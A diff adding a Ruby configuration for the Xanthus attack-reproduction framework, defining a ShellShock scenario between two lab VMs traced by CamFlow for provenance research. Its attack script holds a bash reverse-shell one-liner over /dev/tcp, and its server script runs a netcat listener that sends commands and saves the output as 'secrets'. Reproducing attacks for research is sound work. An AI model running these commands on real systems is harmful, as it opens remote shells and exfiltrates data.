@@ -1,0 +1,90 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby
+
+
+# -*- mode: ruby -*-
+# vi: set ft=ruby
+
+Xanthus.configure do |config|
+  config.name = 'shellshock'
+  config.authors = 'Xueyuan Michael Han'
+  config.description = %q{
+A simple ShellShock example to demonstrate:
+
+* Xanthus' ability to reproduce different types of attacks
+
+A standard Ubuntu 18.04 server is listening at port 8080.
+A victim machine monitored by CamFlow is given a maliciously-formatted bash function definition with trailing code.
+The code is executed and opens up a connection with the server.
+The spawned bash session on the victim because of the bash vulnerability takes standard input from the server,
+which is echoed by the server to be "uname -r ; ls".
+The standard output and standard error are also sent to the server, so essentially,
+a reverse TCP shell is created where any command provided by the server will be executed on the victim,
+and the results of the command will be sent to the server.
+Secret information of the victim machine is therefore exfiltrated. 
+
+In this example, we redirect the output of the commands to a temporary file called "secrets.txt"
+to demonstrate that information was indeed exfiltrated.
+
+Everything is done automatically through scripts for reproducility with minimum human interaction.
+}
+  config.seed = 43670961620410975231081934347800654831
+
+  config.script :camflow_start do
+    Xanthus::CAMFLOW_START
+  end
+
+  config.script :normal do
+    %q{
+    2.times.collect do
+      benign() { echo "Hello world";}
+    end
+    }
+  end
+
+  config.script :attack do
+    %q{%{
+      attack () { ignored;};/bin/bash -i >& /dev/tcp/192.168.33.3/8080 0>&1
+    }}
+  end
+
+  config.script :camflow_stop do
+    Xanthus::CAMFLOW_STOP
+  end
+
+  config.script :server do
+    %q{%{
+      echo "uname -r ; ls" | nc -l 8080 > /tmp/secrets.txt &
+    }}
+  end
+
+  config.vm :camflow do |vm|
+    vm.box = 'michaelh/ubuncam'
+    vm.version = '0.0.3'
+    vm.ip = '192.168.33.8'
+  end
+
+  config.vm :server do |vm|
+    vm.box = 'bento/ubuntu-18.04'
+    vm.version = '201812.27.0'
+    vm.ip = '192.168.33.3'
+  end
+
+  config.job :normal_camflow do |job|
+    job.iterations = 1
+    job.tasks = {camflow: [:camflow_start, :normal, :camflow_stop]}
+    job.outputs = {camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log'}}
+  end
+
+  config.job :attack_camflow do |job|
+    job.iterations = 1
+    job.tasks = {server: [:server], camflow: [:camflow_start, :attack, :camflow_stop]}
+    job.outputs = {server: {trace: '/tmp/secrets.txt'}, camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log'}}
+  end
+
+  # Uncomment the following code and provide GitHub credentials to push the results to GitHub
+  # config.github do |github|
+  #   github.repo = '<ADD GITHUB REPO user/name>'
+  #   github.token = '<ADD GITHUB TOKEN>'
+  # end
+end
